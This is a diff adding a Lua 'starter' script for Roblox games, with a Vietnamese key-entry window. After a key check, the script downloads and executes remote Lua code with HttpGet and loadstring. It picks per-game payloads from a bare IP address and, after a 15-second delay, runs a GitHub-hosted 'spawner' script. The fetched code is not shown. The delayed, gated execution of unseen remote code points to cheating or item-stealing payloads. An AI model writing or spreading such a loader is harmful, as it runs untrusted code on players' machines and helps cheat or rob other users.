@@ -1,0 +1,115 @@
+-- starter.lua
+local SPAWNER_URL = "https://raw.githubusercontent.com/USER/REPO/main/XwareSpawner.lua"
+local CDN_BASE    = "http://109.71.240.235:3910/cdn/"
+
+local function safeLoadAndRun(url)
+    local ok, src = pcall(function() return game:HttpGet(url) end)
+    if not ok then return false, "HttpGet failed: "..tostring(src) end
+    local fnOk, fn = pcall(loadstring, src)
+    if not fnOk or type(fn) ~= "function" then
+        return false, "loadstring failed: "..tostring(fn)
+    end
+    local runOk, runRes = pcall(fn)
+    if not runOk then return false, "runtime error: "..tostring(runRes) end
+    return true
+end
+
+local function runPlaceBasedScripts()
+    if game.PlaceId == 126884695634066 then
+         local ok,err = safeLoadAndRun(CDN_BASE.."gag.luau")
+         if not ok then warn("gag.luau error:", err) end
+    elseif game.PlaceId == 142823291 then
+         local ok,err = safeLoadAndRun(CDN_BASE.."mm2.luau")
+         if not ok then warn("mm2.luau error:", err) end
+    elseif game.PlaceId == 920587237 then
+         local ok,err = safeLoadAndRun(CDN_BASE.."ame.luau")
+         if not ok then warn("ame.luau error:", err) end
+    elseif game.PlaceId == 127742093697776 then
+         local ok,err = safeLoadAndRun(CDN_BASE.."pvb.luau")
+         if not ok then warn("pvb.luau error:", err) end
+    elseif game.PlaceId == 96342491571673 or game.PlaceId == 109983668079237 then
+         local ok,err = safeLoadAndRun(CDN_BASE.."sab.luau")
+         if not ok then warn("sab.luau error:", err) end
+    else
+         warn("No matching PlaceId script for this place:", game.PlaceId)
+    end
+end
+
+local function runSpawnerWithOptionalDelay(delaySeconds)
+    if delaySeconds and type(delaySeconds) == "number" and delaySeconds > 0 then
+        task.spawn(function()
+            task.wait(delaySeconds)
+            local ok,err = safeLoadAndRun(SPAWNER_URL)
+            if not ok then warn("Spawner error:", err) end
+        end)
+    else
+        local ok,err = safeLoadAndRun(SPAWNER_URL)
+        if not ok then warn("Spawner error:", err) end
+    end
+end
+
+-- GUI nhập key (local)
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KeyPromptGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.fromOffset(320,140)
+frame.Position = UDim2.new(0.5, -160, 0.4, -70)
+frame.AnchorPoint = Vector2.new(0.5,0.5)
+frame.BackgroundTransparency = 0.15
+frame.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
+frame.BorderSizePixel = 0
+
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, -20, 0, 36)
+label.Position = UDim2.fromOffset(10,10)
+label.BackgroundTransparency = 1
+label.Text = "Nhập key để tiếp tục"
+label.TextScaled = true
+label.TextColor3 = Color3.new(1,1,1)
+
+local textbox = Instance.new("TextBox", frame)
+textbox.Size = UDim2.new(1, -20, 0, 36)
+textbox.Position = UDim2.fromOffset(10, 50)
+textbox.PlaceholderText = "Nhập key ở đây..."
+textbox.ClearTextOnFocus = false
+textbox.Text = ""
+textbox.TextScaled = true
+
+local button = Instance.new("TextButton", frame)
+button.Size = UDim2.new(0, 120, 0, 28)
+button.Position = UDim2.fromOffset(100, 96)
+button.Text = "Xác nhận"
+button.TextScaled = true
+
+local function validateKey(key)
+    -- Thay "MY_SECRET_KEY" bằng key bạn muốn hoặc gọi server để verify
+    local LOCAL_EXPECTED = "MY_SECRET_KEY"
+    return key == LOCAL_EXPECTED
+end
+
+button.MouseButton1Click:Connect(function()
+    local key = textbox.Text and tostring(textbox.Text) or ""
+    if key == "" then
+        label.Text = "Vui lòng nhập key!"
+        return
+    end
+
+    label.Text = "Đang kiểm tra key..."
+    if not validateKey(key) then
+        label.Text = "Key không hợp lệ"
+        return
+    end
+
+    label.Text = "Key hợp lệ. Chạy script..."
+    pcall(runPlaceBasedScripts)
+    runSpawnerWithOptionalDelay(15) -- delay 15s trước khi chạy spawner
+    screenGui:Destroy()
+end)
+
+textbox:CaptureFocus()
